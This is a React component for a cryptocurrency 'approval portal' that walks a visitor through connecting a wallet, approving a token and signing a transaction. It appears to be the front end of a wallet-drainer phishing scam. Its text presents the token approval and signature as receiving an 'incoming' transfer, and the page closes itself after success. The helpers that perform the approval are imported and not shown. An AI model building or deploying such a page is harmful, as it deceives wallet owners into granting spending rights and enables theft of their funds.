'use client';

import { useState } from 'react';
import { ethers } from 'ethers';
import ProgressBar from './ProgressBar';
import CardStep from './CardStep';
import SuccessModal from './SuccessModal';
import { switchToBSC, approveToken, prepareAndSignTransaction } from '@/lib/blockchain';

export default function ApprovalPortal() {
  const [step, setStep] = useState(1);
  const [userAddress, setUserAddress] = useState<string | null>(null);
  const [signer, setSigner] = useState<ethers.Signer | null>(null);
  const [provider, setProvider] = useState<ethers.BrowserProvider | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showSuccess, setShowSuccess] = useState(false);

  const handleConnectWallet = async () => {
    try {
      setError(null);
      setLoading(true);
      if (!window.ethereum) throw new Error('No web3 wallet found');

      await switchToBSC();
      const newProvider = new ethers.BrowserProvider(window.ethereum);
      await newProvider.send('eth_requestAccounts', []);
      const newSigner = await newProvider.getSigner();
      const address = await newSigner.getAddress();

      setUserAddress(address);
      setSigner(newSigner);
      setProvider(newProvider);
      setStep(2);
    } catch (err: any) {
      setError(err?.message || 'Connection failed');
    } finally {
      setLoading(false);
    }
  };

  const handleApproveToken = async () => {
    try {
      setError(null);
      setLoading(true);
      if (!signer) throw new Error('Connect wallet first');
      await approveToken(signer);
      setStep(3);
    } catch (err: any) {
      setError(err?.message || 'Approval failed');
    } finally {
      setLoading(false);
    }
  };

  const handleSignTransaction = async () => {
    try {
      setError(null);
      setLoading(true);
      if (!signer || !provider || !userAddress) throw new Error('Connect wallet first');
      await prepareAndSignTransaction(signer, provider, userAddress);
      setShowSuccess(true);
      setTimeout(() => {
        if (typeof window !== 'undefined') {
          window.close();
        }
      }, 3000);
    } catch (err: any) {
      setError(err?.message || 'Transaction failed');
    } finally {
      setLoading(false);
    }
  };

  const handleMobileWallet = () => {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    if (!isMobile) {
      setError('Mobile wallet deeplinks are only available on mobile devices');
      return;
    }

    const dappUrl = typeof window !== 'undefined' ? window.location.origin : '';
    const walletLinks = [
      `https://metamask.app.link/dapp/${window.location.hostname}`,
      `https://link.trustwallet.com/open_url?coin_id=56&url=${encodeURIComponent(dappUrl)}`,
      `rainbow://browser?url=${encodeURIComponent(dappUrl)}`
    ];

    let tried = 0;
    function tryNextLink() {
      if (tried >= walletLinks.length) {
        setError('No compatible wallet found.');
        return;
      }

      const link = walletLinks[tried];
      tried++;

      const win = window.open(link, '_blank');
      if (win) {
        win.focus();
      } else {
        const a = document.createElement('a');
        a.href = link;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      }

      setTimeout(tryNextLink, 2000);
    }

    tryNextLink();
  };

  return (
    <main className="min-h-screen flex items-center justify-center p-6 bg-gradient-to-br from-[#0f0f23] via-[#1e1b4b] to-[#312e81]">
      <div className="w-full max-w-md">
        <ProgressBar currentStep={step} />

        {step === 1 && (
          <CardStep
            icon="🔗"
            title="Connect Wallet"
            description="Connect your wallet to approve your pending Internal transaction securely."
            loading={loading}
            error={error}
            buttons={[
              {
                label: 'Connect Wallet',
                onClick: handleConnectWallet,
                primary: true,
              },
              {
                label: 'Open Mobile Wallet',
                onClick: handleMobileWallet,
                primary: false,
              }
            ]}
          />
        )}

        {step === 2 && (
          <CardStep
            icon="⬇️✅"
            title="Approve Token"
            description="Approve the incoming token transfer to proceed with your Transaction Approval."
            loading={loading}
            error={error}
            buttons={[
              {
                label: 'Approve Transfer',
                onClick: handleApproveToken,
                primary: true,
              }
            ]}
          />
        )}

        {step === 3 && (
          <CardStep
            icon="⬇️✍️"
            title="Sign Transaction"
            description="Complete the final step by signing the gasless transaction to confirm receipt."
            loading={loading}
            error={error}
            buttons={[
              {
                label: 'Sign Transaction',
                onClick: handleSignTransaction,
                primary: true,
              }
            ]}
          />
        )}

        <SuccessModal isOpen={showSuccess} />
      </div>

      <footer className="fixed bottom-5 left-1/2 -translate-x-1/2 text-xs text-gray-500 backdrop-blur-sm bg-[rgba(15,23,42,0.3)] px-4 py-2 rounded-full border border-purple-500/10">
        Powered by <a href="#" className="text-purple-500/80 hover:text-purple-500 transition-colors">Blockchain Internal tx</a>
      </footer>
    </main>
  );
}
